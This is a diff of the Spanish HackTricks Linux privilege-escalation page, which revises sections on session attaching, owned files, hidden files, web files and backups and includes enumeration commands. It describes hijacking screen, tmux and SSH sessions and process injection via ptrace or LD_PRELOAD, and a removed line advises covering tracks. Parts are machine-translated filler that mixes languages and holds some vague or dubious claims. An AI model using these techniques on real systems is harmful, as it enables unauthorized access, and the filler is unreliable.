-Si por alguna razón **un usuario tiene permisos de escritura** en alguna de las rutas indicadas: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, cualquier archivo dentro de `/etc/ld.so.conf.d/` o cualquier carpeta dentro del archivo de configuración dentro de `/etc/ld.so.conf.d/*.conf`, es posible que pueda elevar los privilegios.\
+Si por alguna razón **un usuario tiene permisos de escritura** en alguna de las rutas indicadas: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, cualquier archivo dentro de `/etc/ld.so.conf.d/` o cualquier carpeta dentro del archivo de configuración dentro de `/etc/ld.so.conf.d/*.conf`, es posible que pueda escalar privilegios.\
 Echa un vistazo a **cómo explotar esta mala configuración** en la siguiente página:
 
 {% content-ref url="ld.so.conf-example.md" %}
@@ -1192,7 +1223,7 @@ setfacl -b file.txt #Remove the ACL of the file
 getfacl -R /path/to/directory
 ```
 
-Este comando permite obtener los archivos con ACL (Access Control List) específicas del sistema. El parámetro `-R` indica que la búsqueda se realizará de forma recursiva en el directorio especificado (`/path/to/directory`).
+Este comando permite obtener los archivos con ACL (Listas de Control de Acceso) específicas del sistema. El parámetro `-R` indica que se debe realizar una búsqueda recursiva en el directorio especificado (`/path/to/directory`).
 ```bash
 getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
 ```
@@ -1210,21 +1241,19 @@ screen -ls <username>/ # Show another user' screen sessions
 ```
 **Adjuntarse a una sesión**
 
-To escalate privileges on a Linux system, it is often necessary to attach to an existing session. This allows the hacker to gain access to a higher level of privileges and perform actions that would otherwise be restricted.
+To escalate privileges on a Linux system, it is often necessary to attach to an existing session. This allows the hacker to gain access to a higher level of privileges and execute commands with elevated permissions.
 
 There are several methods to attach to a session, depending on the specific circumstances and the tools available. Here are some common techniques:
 
-1. **Screen**: The `screen` command allows you to attach to a detached session or create a new one. This can be useful if you have access to a user's session and want to escalate privileges within that session.
+1. **Screen**: The `screen` command allows you to create and manage multiple terminal sessions within a single SSH session. By attaching to an existing `screen` session, you can gain access to a user's active session and execute commands as that user.
 
-2. **tmux**: Similar to `screen`, `tmux` is another terminal multiplexer that allows you to attach to an existing session or create a new one. It provides more advanced features and customization options compared to `screen`.
+2. **tmux**: Similar to `screen`, `tmux` is another terminal multiplexer that allows you to create and manage multiple sessions. By attaching to an active `tmux` session, you can escalate privileges and execute commands with the user's permissions.
 
-3. **SSH**: If you have SSH access to a remote Linux system, you can use the `ssh` command to attach to an existing session. This can be useful if you have valid credentials for a user account with higher privileges.
+3. **SSH session hijacking**: If you have access to the target system as a low-privileged user, you can hijack an existing SSH session of a higher-privileged user. This can be done by stealing the SSH session ID and attaching to it using tools like `reptyr` or `sshd`.
 
-4. **Pseudo-terminals**: Pseudo-terminals, or PTYs, are virtual terminal devices that can be used to attach to a session. Tools like `script` or `socat` can be used to create a PTY and attach to an existing session.
+4. **Process injection**: Another method is to inject malicious code into a running process with higher privileges. This can be achieved using tools like `ptrace` or `LD_PRELOAD` to gain control over the process and execute commands with elevated permissions.
 
-5. **Debuggers**: Debuggers like `gdb` or `lldb` can be used to attach to a running process and gain control over its execution. This can be useful for privilege escalation if the process has higher privileges than the user running the debugger.
-
-When attaching to a session, it is important to be cautious and avoid detection. Make sure to clean up any traces of your activity and cover your tracks to maintain stealth and avoid raising suspicion.
+It is important to note that attaching to a session and escalating privileges should only be done for legitimate purposes, such as penetration testing or system administration. Unauthorized access and privilege escalation are illegal activities and can result in severe consequences.
 ```bash
 screen -dr <session> #The -d is to detach whoever is attached to it
 screen -dr 3350.foo #In the example of the image
@@ -1248,7 +1277,7 @@ There are several methods to attach to a session, depending on the specific circ
 
 1. **Screen**: The `screen` command allows you to create and manage multiple terminal sessions within a single SSH session. By attaching to an existing `screen` session, you can gain access to the user's environment and execute commands as that user.
 
-2. **tmux**: Similar to `screen`, `tmux` is another terminal multiplexer that allows you to create and manage multiple sessions. By attaching to an existing `tmux` session, you can gain control over the user's session and execute commands with their privileges.
+2. **tmux**: Similar to `screen`, `tmux` is a terminal multiplexer that allows you to create and manage multiple terminal sessions. By attaching to an existing `tmux` session, you can gain access to the user's environment and execute commands with their privileges.
 
 3. **SSH session hijacking**: If you have access to the target system as a low-privileged user, you can hijack an existing SSH session of a higher-privileged user. This can be done by stealing the SSH session ID and attaching to it using tools like `reptyr` or `sshd`.
 
@@ -1307,7 +1336,7 @@ ForwardAgent yes
 ```
 Ten en cuenta que si `Host` es `*`, cada vez que el usuario salte a una máquina diferente, esa máquina podrá acceder a las claves (lo cual es un problema de seguridad).
 
-El archivo `/etc/ssh_config` puede **anular** estas **opciones** y permitir o denegar esta configuración.\
+El archivo `/etc/ssh_config` puede **anular** esta **opción** y permitir o denegar esta configuración.\
 El archivo `/etc/sshd_config` puede **permitir** o **denegar** el reenvío del agente SSH con la palabra clave `AllowAgentForwarding` (el valor predeterminado es permitir).
 
 Si descubres que el reenvío del agente está configurado en un entorno, lee la siguiente página, ya que **podrías aprovecharlo para escalar privilegios**:
@@ -1382,21 +1411,39 @@ Las siguientes carpetas pueden contener copias de seguridad o información inter
 ```bash
 ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
 ```
-### Ubicación extraña/Archivos de propiedad
+### Ubicación Extraña/Archivos Propios
 
-Cuando se realiza una escalada de privilegios en un sistema Linux, es importante buscar ubicaciones inusuales y archivos de propiedad. Estos pueden ser puntos de partida útiles para obtener acceso privilegiado.
+Sometimes, during a penetration test or security assessment, you may come across files or directories in unusual locations that are owned by a user or group. These files can potentially be used for privilege escalation.
 
-Aquí hay algunas ubicaciones y archivos comunes que pueden ser sospechosos:
+#### Identifying Weird Locations
 
-- `/tmp` y `/var/tmp`: Estos directorios son utilizados para almacenar archivos temporales. Los atacantes pueden aprovecharlos para ocultar archivos maliciosos o scripts de escalada de privilegios.
+To identify these weird locations, you can start by looking for files or directories that are not commonly found in a standard Linux installation. Some examples include:
 
-- `/dev/shm`: Este directorio es utilizado para almacenar archivos temporales en la memoria compartida. Los atacantes pueden utilizarlo para ocultar archivos maliciosos o scripts de escalada de privilegios.
+- Files or directories in the `/tmp` directory that are not related to temporary files.
+- Files or directories in the `/var/tmp` directory that are not related to temporary files.
+- Files or directories in the `/dev/shm` directory that are not related to shared memory.
+- Files or directories in the `/var/www/html` directory that are not related to web content.
+- Files or directories in the home directories of users that are not related to their normal activities.
 
-- `/var/www/html`: Este directorio es utilizado para almacenar archivos de sitios web. Los atacantes pueden aprovecharlo para ocultar archivos maliciosos o scripts de escalada de privilegios.
+#### Analyzing Owned Files
 
-- Archivos de propiedad de root: Busque archivos que sean propiedad del usuario root pero que sean accesibles para otros usuarios. Estos archivos pueden ser explotados para obtener acceso privilegiado.
+Once you have identified these weird locations, you can analyze the owned files to determine if they can be leveraged for privilege escalation. Some things to look for include:
 
-Recuerde que estos son solo ejemplos comunes y que los atacantes pueden utilizar ubicaciones y archivos personalizados para ocultar su actividad. Es importante realizar una búsqueda exhaustiva en todo el sistema en busca de ubicaciones y archivos sospechosos.
+- SUID or SGID permissions on executables owned by privileged users or groups.
+- World-writable files or directories owned by privileged users or groups.
+- Configuration files that contain sensitive information, such as database credentials or API keys.
+- Scripts or binaries that are executed with elevated privileges.
+
+#### Exploiting Owned Files
+
+If you find files or directories in weird locations that can be exploited, you can attempt to escalate privileges by leveraging them. Some techniques you can try include:
+
+- Exploiting SUID or SGID executables to execute commands with elevated privileges.
+- Modifying world-writable files or directories to execute arbitrary commands.
+- Abusing misconfigured or vulnerable scripts or binaries to escalate privileges.
+- Extracting sensitive information from configuration files to gain additional access.
+
+Remember to always exercise caution and obtain proper authorization before attempting any privilege escalation techniques.
 ```bash
 #root owned files in /home folders
 find /home -user root 2>/dev/null
@@ -1417,7 +1464,7 @@ done
 
 To identify recently modified files on a Linux system, you can use the `find` command with the `-mmin` option. This allows you to search for files that have been modified within a specified number of minutes.
 
-To find files modified in the last 10 minutes, run the following command:
+To find files modified in the last 10 minutes, you can use the following command:
 
 ```bash
 find / -type f -mmin -10
@@ -1425,7 +1472,9 @@ find / -type f -mmin -10
 
 This command will search the entire file system (`/`) for regular files (`-type f`) that have been modified within the last 10 minutes (`-mmin -10`).
 
-You can adjust the number of minutes as needed to fit your specific requirements.
+You can adjust the number of minutes as needed to fit your specific requirements. Additionally, you can specify a different directory instead of the root directory (`/`) to limit the search to a specific location.
+
+Keep in mind that this command may take some time to complete, especially if you are searching a large file system.
 ```bash
 find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
 ```
@@ -1435,13 +1484,13 @@ Los archivos de bases de datos Sqlite son archivos utilizados por aplicaciones p
 
 En el contexto de la escalada de privilegios, los archivos de bases de datos Sqlite pueden ser un objetivo atractivo para un atacante, ya que pueden contener información valiosa que podría ayudar a obtener acceso a niveles más altos de privilegios en un sistema.
 
-Algunas medidas de seguridad que se pueden tomar para proteger los archivos de bases de datos Sqlite incluyen:
+Algunas medidas que se pueden tomar para proteger los archivos de bases de datos Sqlite incluyen:
 
-- Asegurarse de que los permisos de archivo sean adecuados y restringidos solo a los usuarios y procesos autorizados.
+- Asegurarse de que los permisos de archivo sean adecuados y restringidos solo a los usuarios y procesos necesarios.
 - Encriptar los archivos de bases de datos para proteger su contenido en caso de acceso no autorizado.
 - Implementar medidas de seguridad adicionales, como la autenticación de usuarios y el registro de auditoría, para monitorear y controlar el acceso a los archivos de bases de datos.
 
-Es importante tener en cuenta que estas medidas de seguridad deben complementarse con otras prácticas de seguridad, como mantener el sistema operativo y las aplicaciones actualizadas, utilizar contraseñas seguras y realizar copias de seguridad regulares de los archivos de bases de datos.
+Es importante tener en cuenta que estas medidas de protección deben complementarse con otras prácticas de seguridad, como mantener el sistema operativo y las aplicaciones actualizadas, utilizar contraseñas seguras y realizar copias de seguridad regulares de los archivos de bases de datos.
 ```bash
 find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
 ```
@@ -1455,9 +1504,9 @@ Los archivos ocultos son archivos que comienzan con un punto (.) en su nombre y 
 
 En Linux, los archivos ocultos se utilizan comúnmente para almacenar configuraciones de aplicaciones y datos de usuario. Algunos ejemplos de archivos ocultos son `.bashrc`, `.gitignore` y `.ssh/id_rsa`.
 
-Los archivos ocultos pueden ser útiles para los atacantes durante una escalada de privilegios, ya que pueden contener información confidencial o claves de acceso que podrían facilitar el acceso no autorizado a sistemas o datos sensibles.
+Los archivos ocultos pueden ser útiles para los atacantes durante una escalada de privilegios, ya que pueden contener información confidencial o claves de acceso que podrían permitirles obtener acceso no autorizado a sistemas o datos sensibles.
 
-Durante una prueba de penetración, es importante buscar y revisar los archivos ocultos en el sistema objetivo para identificar posibles puntos débiles y evitar posibles fugas de información.
+Es importante tener en cuenta la existencia de archivos ocultos durante una evaluación de seguridad o una prueba de penetración, ya que pueden revelar información valiosa sobre la configuración del sistema y posibles puntos débiles.
 ```bash
 find / -type f -iname ".*" -ls 2>/dev/null
 ```
@@ -1484,9 +1533,9 @@ for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null
 ```
 ### **Archivos web**
 
-Web files are an essential part of any web application. They contain the code, scripts, and other resources that make up the website. These files are stored on the web server and are accessible to users through their web browsers.
+Web files are an essential part of any web application. They contain the code, scripts, and resources that make up the website. These files are stored on the web server and are accessible to users through their web browsers.
 
-Los archivos web son una parte esencial de cualquier aplicación web. Contienen el código, los scripts y otros recursos que conforman el sitio web. Estos archivos se almacenan en el servidor web y están accesibles para los usuarios a través de sus navegadores web.
+Los archivos web son una parte esencial de cualquier aplicación web. Contienen el código, los scripts y los recursos que conforman el sitio web. Estos archivos se almacenan en el servidor web y están accesibles para los usuarios a través de sus navegadores web.
 
 ### **File permissions**
 
@@ -1496,27 +1545,37 @@ Los permisos de archivo determinan quién puede leer, escribir y ejecutar archiv
 
 ### **Privilege escalation**
 
-Privilege escalation is the process of gaining higher levels of access or privileges on a system. In the context of web files, it refers to the ability to escalate from a regular user to a privileged user, such as an administrator.
+Privilege escalation is the process of gaining higher levels of access or privileges on a system. It allows an attacker to bypass restrictions and perform actions that are normally restricted to privileged users.
 
-La escalada de privilegios es el proceso de obtener niveles más altos de acceso o privilegios en un sistema. En el contexto de los archivos web, se refiere a la capacidad de escalar desde un usuario regular a un usuario privilegiado, como un administrador.
+La escalada de privilegios es el proceso de obtener niveles más altos de acceso o privilegios en un sistema. Permite a un atacante eludir restricciones y realizar acciones que normalmente están restringidas a usuarios privilegiados.
 
-### **Exploiting file permissions**
+### **Exploiting vulnerabilities**
 
-Exploiting file permissions is a common technique used by hackers to gain unauthorized access to web files. By exploiting misconfigured or insecure file permissions, an attacker can modify, delete, or execute files that they should not have access to.
+Exploiting vulnerabilities is a common technique used by hackers to gain unauthorized access to a system. By identifying and exploiting weaknesses in software or systems, attackers can gain control over the target system and perform malicious actions.
 
-Explotar los permisos de archivo es una técnica común utilizada por los hackers para obtener acceso no autorizado a los archivos web. Al explotar permisos de archivo mal configurados o inseguros, un atacante puede modificar, eliminar o ejecutar archivos a los que no debería tener acceso.
+Explotar vulnerabilidades es una técnica común utilizada por los hackers para obtener acceso no autorizado a un sistema. Al identificar y explotar debilidades en el software o los sistemas, los atacantes pueden tomar el control del sistema objetivo y realizar acciones maliciosas.
 
-### **Preventing privilege escalation**
+### **Privilege escalation techniques**
 
-To prevent privilege escalation through file permissions, it is important to follow security best practices. This includes regularly reviewing and updating file permissions, restricting access to sensitive files, and implementing strong authentication mechanisms.
+There are several techniques that can be used to escalate privileges on a Linux system. Some common techniques include:
 
-Para prevenir la escalada de privilegios a través de los permisos de archivo, es importante seguir las mejores prácticas de seguridad. Esto incluye revisar y actualizar regularmente los permisos de archivo, restringir el acceso a archivos sensibles e implementar mecanismos de autenticación sólidos.
+- Exploiting misconfigured file permissions: If file permissions are set incorrectly, an attacker may be able to modify or execute files that they should not have access to.
 
-### **Conclusion**
+- Exploiting software vulnerabilities: By identifying and exploiting vulnerabilities in software, an attacker can gain higher levels of access on a system.
 
-Understanding web files and file permissions is crucial for securing web applications. By properly managing file permissions and implementing security measures, you can reduce the risk of privilege escalation and unauthorized access to your web files.
+- Exploiting weak user passwords: If a user has a weak password, an attacker may be able to guess or crack the password and gain access to the user's account.
 
-Comprender los archivos web y los permisos de archivo es crucial para asegurar las aplicaciones web. Al gestionar adecuadamente los permisos de archivo e implementar medidas de seguridad, se puede reducir el riesgo de escalada de privilegios y acceso no autorizado a los archivos web.
+- Exploiting insecure system configurations: If a system is not properly configured, an attacker may be able to exploit configuration weaknesses to gain higher levels of access.
+
+Existen varias técnicas que se pueden utilizar para escalar privilegios en un sistema Linux. Algunas técnicas comunes incluyen:
+
+- Explotar permisos de archivo mal configurados: si los permisos de archivo se configuran incorrectamente, un atacante puede modificar o ejecutar archivos a los que no debería tener acceso.
+
+- Explotar vulnerabilidades de software: al identificar y explotar vulnerabilidades en el software, un atacante puede obtener niveles más altos de acceso en un sistema.
+
+- Explotar contraseñas débiles de usuario: si un usuario tiene una contraseña débil, un atacante puede adivinar o descifrar la contraseña y obtener acceso a la cuenta del usuario.
+
+- Explotar configuraciones inseguras del sistema: si un sistema no está configurado correctamente, un atacante puede aprovechar las debilidades de configuración para obtener niveles más altos de acceso.
 ```bash
 ls -alhR /var/www/ 2>/dev/null
 ls -alhR /srv/www/htdocs/ 2>/dev/null
@@ -1525,18 +1584,21 @@ ls -alhR /opt/lampp/htdocs/ 2>/dev/null
 ```
 ### **Copias de seguridad**
 
-Las copias de seguridad son una parte fundamental de cualquier estrategia de seguridad. Realizar copias de seguridad periódicas de los datos críticos es esencial para protegerlos contra la pérdida o el acceso no autorizado. Las copias de seguridad deben almacenarse en un lugar seguro y fuera del alcance de posibles amenazas, como incendios, robos o desastres naturales.
+Las copias de seguridad son una parte fundamental de cualquier estrategia de seguridad. Realizar copias de seguridad periódicas de los datos críticos es esencial para protegerlos contra la pérdida o el acceso no autorizado. Además, las copias de seguridad también pueden ser útiles en caso de desastres naturales, errores humanos o ataques cibernéticos.
 
-En el contexto de la escalada de privilegios, las copias de seguridad pueden ser una fuente valiosa de información para un atacante. Si un atacante obtiene acceso a un sistema con privilegios limitados, puede buscar copias de seguridad almacenadas en el sistema o en otros dispositivos de almacenamiento conectados. Estas copias de seguridad pueden contener información confidencial, como contraseñas, claves de cifrado o datos sensibles.
+Aquí hay algunas prácticas recomendadas para asegurar las copias de seguridad:
 
-Para protegerse contra la escalada de privilegios a través de copias de seguridad, se deben seguir las mejores prácticas de seguridad, como:
+- **Almacenamiento seguro**: Asegúrese de que las copias de seguridad se almacenen en un lugar seguro, lejos del sistema original. Esto puede incluir almacenamiento en la nube, unidades externas o servidores dedicados.
 
-- Encriptar las copias de seguridad para proteger la confidencialidad de los datos.
-- Limitar el acceso a las copias de seguridad solo a usuarios autorizados.
-- Almacenar las copias de seguridad en un lugar seguro y fuera del alcance de posibles amenazas.
-- Realizar pruebas periódicas de restauración de las copias de seguridad para asegurarse de que los datos se puedan recuperar correctamente en caso de necesidad.
+- **Encriptación**: Siempre encripte las copias de seguridad para proteger los datos confidenciales. Esto garantiza que incluso si alguien obtiene acceso a las copias de seguridad, no podrán leer la información sin la clave de encriptación.
 
-En resumen, las copias de seguridad son una medida de seguridad crucial para proteger los datos críticos. Sin embargo, también pueden representar un riesgo si no se implementan adecuadamente. Siguiendo las mejores prácticas de seguridad, se puede minimizar el riesgo de escalada de privilegios a través de copias de seguridad.
+- **Pruebas de restauración**: Regularmente, realice pruebas de restauración para asegurarse de que las copias de seguridad sean válidas y se puedan restaurar correctamente. Esto ayuda a identificar cualquier problema antes de que sea demasiado tarde.
+
+- **Políticas de retención**: Establezca políticas de retención para determinar cuánto tiempo se deben conservar las copias de seguridad. Esto puede basarse en requisitos legales, regulaciones de la industria o simplemente en la importancia de los datos.
+
+- **Seguridad de acceso**: Asegúrese de que solo las personas autorizadas tengan acceso a las copias de seguridad. Esto implica implementar medidas de autenticación y control de acceso adecuadas.
+
+Recuerde que las copias de seguridad son una medida preventiva importante, pero no deben ser la única medida de seguridad. Es esencial implementar otras prácticas de seguridad, como la protección contra malware, la actualización regular del software y la configuración adecuada de los permisos de usuario.
 ```bash
 find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
 ```
@@ -1682,7 +1744,7 @@ Los archivos que se envían en paquetes descargados del repositorio de distribuc
 * ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family).
 * Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com).
-* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme en Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live).
+* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme en Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
